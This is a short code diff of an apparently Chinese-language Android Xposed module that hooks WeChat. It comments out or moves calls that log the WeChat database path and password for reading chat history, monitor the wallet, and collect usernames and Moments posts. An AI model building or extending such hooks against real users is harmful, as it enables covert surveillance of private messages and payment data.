@@ -145,10 +145,11 @@ public class MainHook implements IXposedHookLoadPackage {
         //判断是否具有全部微信权限
         if (test_put){
         XposedBridge.log("权限开启中");
+          //  WechatUsernameHook.hook();//获取微信昵称 微信号 用户名等
 
 
-
-
+          /*  WechatEntity wechatEntity = WechatEntityFactory.create(applicationContext);
+            MomentHook.hook(applicationContext,wechatEntity,lpparam);//朋友圈*/
 
 
 
@@ -168,7 +169,6 @@ public class MainHook implements IXposedHookLoadPackage {
         ClassLoader classLoader1 = lpparam.classLoader;
             //读取微信数据库聊天历史的时候要先初始化这个
         LogWechatDbPathAndPwdHook.hook(create,lpparam,classLoader1,mContext);
-            //WechatUsernameHook.hook();//获取微信昵称 微信号 用户名等
             //监听钱包
         WalletHook.hook(create, lpparam,classLoader1,mContext);
             //敏感词操作
